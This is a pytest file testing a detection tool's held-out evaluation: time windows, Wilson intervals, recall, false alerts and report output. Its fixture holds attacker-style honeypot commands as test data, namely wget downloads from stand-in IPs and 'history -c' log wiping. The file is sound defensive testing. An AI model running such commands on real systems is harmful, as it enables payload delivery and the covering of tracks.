"""The held-out evaluation: splitting, counting, intervals and the report."""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from deception_shield.evaluation import (
    Window,
    evaluate,
    parse_window,
    to_json,
    to_markdown,
    wilson_interval,
)
from deception_shield.labels import Label
from deception_shield.sigma import load_rules

HOLDOUT_START = datetime(2026, 9, 28, tzinfo=timezone.utc)
DEV = HOLDOUT_START - timedelta(days=3)
HELD = HOLDOUT_START + timedelta(days=2)
LATER = HOLDOUT_START + timedelta(days=9)


class TestWindows:
    def test_an_iso_week(self) -> None:
        window = parse_window("2026-W40")
        assert window == Window(HOLDOUT_START, HOLDOUT_START + timedelta(days=7))

    def test_an_interval(self) -> None:
        window = parse_window("2026-09-28/2026-10-01T12:00:00Z")
        assert window.start == HOLDOUT_START
        assert window.end == datetime(2026, 10, 1, 12, tzinfo=timezone.utc)

    def test_the_end_is_exclusive(self) -> None:
        window = parse_window("2026-W40")
        assert window.contains(HOLDOUT_START) and not window.contains(window.end)

    @pytest.mark.parametrize(
        "text", ["2026-W60", "next week", "2026-10-05/2026-09-28", "2026-09-28/whenever"]
    )
    def test_unreadable_windows(self, text: str) -> None:
        with pytest.raises(ValueError):
            parse_window(text)


class TestWilsonInterval:
    def test_zero_failures_still_has_an_upper_bound(self) -> None:
        low, high = wilson_interval(0, 500)
        assert low == 0.0 and high == pytest.approx(0.00762, abs=1e-4)

    def test_known_values(self) -> None:
        assert wilson_interval(4, 500) == pytest.approx((0.00312, 0.02040), abs=1e-4)
        assert wilson_interval(138, 152) == pytest.approx((0.8523, 0.9439), abs=1e-3)

    def test_the_interval_stays_inside_zero_and_one(self) -> None:
        low, high = wilson_interval(10, 10)
        assert 0.0 < low < 1.0 and high == pytest.approx(1.0)

    def test_an_empty_sample_has_no_interval(self) -> None:
        with pytest.raises(ValueError):
            wilson_interval(0, 0)


@pytest.fixture
def corpus(session_factory):
    s = session_factory
    sessions = [
        # development weeks
        s("hp/a1", ("wget http://203.0.113.4/a",), start=DEV),
        s("hp/a2", ("history -c",), start=DEV),
        s("hp/a3", ("uname -s -v -n -r -m",), start=DEV),
        s("hp/x1", ("exit",), start=DEV),
        s("host/b1", ("ls",), start=DEV, origin="shell-history"),
        s("host/b2", ("wget https://example.com/f",), start=DEV, origin="shell-history"),
        # held-out window
        s("hp/a4", ("cd /tmp; wget http://198.51.100.9/b",), start=HELD),
        s("hp/a5", ("wget http://192.0.2.77/c",), start=HELD),
        s("hp/a6", ("nproc",), start=HELD),
        s("host/b3", ("ls",), start=HELD, origin="shell-history"),
        s("host/b4", ("df -h",), start=HELD, origin="shell-history"),
        s(
            "host/b5",
            ("wget https://example.com/y; history -c",),
            start=HELD,
            origin="shell-history",
        ),
        s("hp/u1", ("whoami",), start=HELD),
        # after the window
        s("hp/l1", ("wget http://203.0.113.4/z",), start=LATER),
    ]
    labels = {
        "hp/a1": Label("hp/a1", "attack", ("T1105",)),
        "hp/a2": Label("hp/a2", "attack", ("T1070.003",)),
        "hp/a3": Label("hp/a3", "attack", ("T1082",)),
        "hp/x1": Label("hp/x1", "exclude"),
        "host/b1": Label("host/b1", "benign"),
        "host/b2": Label("host/b2", "benign"),
        "hp/a4": Label("hp/a4", "attack", ("T1105",)),
        "hp/a5": Label("hp/a5", "attack", ("T1105",)),
        "hp/a6": Label("hp/a6", "attack", ()),
        "host/b3": Label("host/b3", "benign"),
        "host/b4": Label("host/b4", "benign"),
        "host/b5": Label("host/b5", "benign"),
        "hp/l1": Label("hp/l1", "attack", ("T1105",)),
    }
    return sessions, labels


@pytest.fixture
def evaluation(corpus, small_rules: Path, tmp_path: Path):
    sessions, labels = corpus
    labels_file = tmp_path / "labels.csv"
    labels_file.write_text("session_id,label\n", encoding="utf-8")
    return evaluate(
        sessions, labels, load_rules(small_rules), parse_window("2026-W40"), inputs=[labels_file]
    )


class TestSplits:
    def test_sessions_are_assigned_by_start_time(self, evaluation) -> None:
        assert evaluation.development.sessions == 6
        assert evaluation.held_out.sessions == 7
        assert evaluation.later == 1

    def test_development_counts(self, evaluation) -> None:
        dev = evaluation.development
        assert (dev.attack, dev.detected) == (3, 2)
        assert (dev.benign, dev.benign_alerted, dev.false_alerts) == (2, 1, 1)
        assert (dev.excluded, dev.unlabelled) == (1, 0)
        assert [s.id for s in dev.missed] == ["hp/a3"]

    def test_held_out_counts(self, evaluation) -> None:
        held = evaluation.held_out
        assert (held.attack, held.detected) == (3, 2)
        assert held.recall.percent() == "66.7%"
        assert (held.benign, held.benign_alerted) == (3, 1)

    def test_a_false_alert_is_one_per_rule_per_session(self, evaluation) -> None:
        """host/b5 trips both rules, so it is one alerted session and two false alerts."""
        held = evaluation.held_out
        assert held.false_alerts == 2
        [(session, alerts)] = held.false_positives
        assert session.id == "host/b5" and len(alerts) == 2

    def test_unlabelled_sessions_are_counted_not_guessed(self, evaluation) -> None:
        assert evaluation.held_out.unlabelled == 1

    def test_families_first_seen_in_the_window(self, evaluation) -> None:
        held = evaluation.held_out
        # a5 repeats a1's script; a4 and a6 are new, and a4 is detected.
        assert (held.families, held.families_detected) == (3, 2)
        assert (held.new_families, held.new_families_detected) == (2, 1)

    def test_technique_outcomes_and_coverage_gaps(self, evaluation) -> None:
        dev = evaluation.development
        by_technique = {t.technique: (t.labelled, t.detected) for t in dev.techniques}
        assert by_technique == {"T1070.003": (1, 1), "T1105": (1, 1)}
        assert dev.uncovered == {"T1082": 1}

    def test_rule_outcomes(self, evaluation) -> None:
        outcomes = {r.title: r for r in evaluation.held_out.rules}
        assert outcomes["wget"].attack_sessions == 2 and outcomes["wget"].sole_detector == 2
        assert outcomes["wget"].benign_sessions == 1 and outcomes["history"].benign_sessions == 1

    def test_precision_follows_the_class_mix(self, evaluation) -> None:
        assert evaluation.held_out.precision == pytest.approx(2 / 3)

    def test_the_rule_set_and_inputs_are_identified(self, evaluation) -> None:
        assert evaluation.rule_count == 2
        assert len(evaluation.rules_fingerprint) == 64
        assert evaluation.inputs[0][0].endswith("labels.csv") and len(evaluation.inputs[0][1]) == 64


class TestReport:
    def test_the_headline(self, evaluation) -> None:
        report = to_markdown(evaluation)
        assert "Detected **2 of 3** labelled attack sessions (**66.7%**" in report
        assert "with **2 false alerts** across **3** benign sessions (1 session alerted" in report

    def test_held_out_errors_are_listed_only_on_request(self, evaluation) -> None:
        """Reading the held-out misses invites tuning on the week meant to stay unseen."""
        assert "hp/a3" in to_markdown(evaluation)
        assert "hp/a6" not in to_markdown(evaluation)
        assert "hp/a6" in to_markdown(evaluation, details=True)

    def test_unlabelled_sessions_are_called_out(self, evaluation) -> None:
        assert "have no label" in to_markdown(evaluation)

    def test_json(self, evaluation) -> None:
        data = json.loads(to_json(evaluation))
        held = data["held_out"]
        assert held["attack_detection"]["hits"] == 2 and held["attack_detection"]["total"] == 3
        assert held["false_alerts"] == 2
        assert len(held["attack_detection"]["ci95"]) == 2
        assert data["rules"]["count"] == 2 and data["sessions_after_window"] == 1
        assert data["development"]["uncovered_techniques"] == {"T1082": 1}
